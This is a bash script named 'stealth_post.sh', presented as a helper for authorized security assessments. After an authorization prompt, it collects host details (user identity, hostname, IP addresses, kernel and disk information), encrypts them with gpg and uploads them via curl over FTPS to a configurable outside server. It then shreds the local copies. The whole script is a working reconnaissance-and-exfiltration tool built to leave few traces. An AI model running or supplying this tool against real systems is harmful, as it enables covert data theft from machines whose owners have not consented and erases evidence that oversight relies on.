#!/bin/bash
# stealth_post.sh - encrypted FTPS transfer helper for authorized assessments.
set -euo pipefail

FTP_USER="${FTP_USER:-}"
FTP_PASS="${FTP_PASS:-}"
FTP_HOST="${FTP_HOST:-}"
FTP_PATH="${FTP_PATH:-}"
GPG_PASSPHRASE="${GPG_PASSPHRASE:-}"
CONFIG_FILE="${FTP_CONFIG_FILE:-$HOME/.stealth_post.conf}"
DRY_RUN=false
ASSUME_AUTHORIZED="${SCRIPTING_ASSUME_AUTHORIZED:-false}"

usage() {
    cat <<'EOF' >&2
Usage: stealth_post.sh [options]
  --dry-run                Validate configuration and print planned transfer
  --yes-i-am-authorized    Confirm explicit authorization
  --help                   Show this help

Required environment variables or ~/.stealth_post.conf values:
  FTP_USER, FTP_PASS, FTP_HOST, FTP_PATH, GPG_PASSPHRASE
EOF
    exit 1
}

require_authorization() {
    if [[ "$ASSUME_AUTHORIZED" == true ]]; then
        return 0
    fi

    if [[ ! -t 0 ]]; then
        echo "Authorization confirmation required. Re-run with --yes-i-am-authorized only for approved assessments." >&2
        exit 1
    fi

    read -rp "Type AUTHORIZED to confirm this encrypted transfer is approved: " confirmation
    if [[ "$confirmation" != "AUTHORIZED" ]]; then
        echo "Aborted." >&2
        exit 1
    fi
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --dry-run)
            DRY_RUN=true
            shift
            ;;
        --yes-i-am-authorized)
            ASSUME_AUTHORIZED=true
            shift
            ;;
        --help|-h)
            usage
            ;;
        *)
            usage
            ;;
    esac
done

require_authorization

if [[ -z "$FTP_USER" || -z "$FTP_PASS" || -z "$FTP_HOST" || -z "$FTP_PATH" || -z "$GPG_PASSPHRASE" ]]; then
    if [[ -f "$CONFIG_FILE" ]]; then
        # shellcheck disable=SC1090
        source "$CONFIG_FILE"
        FTP_USER="${FTP_USER:-}"
        FTP_PASS="${FTP_PASS:-}"
        FTP_HOST="${FTP_HOST:-}"
        FTP_PATH="${FTP_PATH:-}"
        GPG_PASSPHRASE="${GPG_PASSPHRASE:-}"
    fi
fi

if [[ -z "$FTP_USER" || -z "$FTP_PASS" || -z "$FTP_HOST" || -z "$FTP_PATH" || -z "$GPG_PASSPHRASE" ]]; then
    echo "FTP_USER, FTP_PASS, FTP_HOST, FTP_PATH, and GPG_PASSPHRASE are required." >&2
    exit 1
fi

if [[ "$DRY_RUN" == true ]]; then
    echo "DRY RUN: collect limited system metadata, encrypt it, and upload to ftps://$FTP_HOST/$FTP_PATH"
    exit 0
fi

for cmd in gpg curl shred; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
        echo "Missing required tool: $cmd" >&2
        exit 1
    fi
done

OUT="$(mktemp)"
ENC_OUT="$OUT.gpg"
trap 'rm -f "$OUT" "$ENC_OUT"' EXIT

{
    echo "[*] $(date '+%Y-%m-%d %H:%M:%S')"
    id
    hostname
    ip -o addr show scope global 2>/dev/null | awk '{print $2, $4}'
    uname -a
    df -h
} > "$OUT"

if ! gpg --batch --yes --passphrase "$GPG_PASSPHRASE" -c "$OUT"; then
    echo "gpg encryption failed." >&2
    exit 1
fi

if ! curl --ftp-ssl --ssl-reqd -sS -T "$ENC_OUT" --user "$FTP_USER:$FTP_PASS" "ftp://$FTP_HOST/$FTP_PATH" --ftp-create-dirs >/dev/null; then
    echo "FTPS upload failed." >&2
    exit 1
fi

shred -u "$OUT" "$ENC_OUT"
trap - EXIT
echo "Encrypted metadata uploaded to ftps://$FTP_HOST/$FTP_PATH"
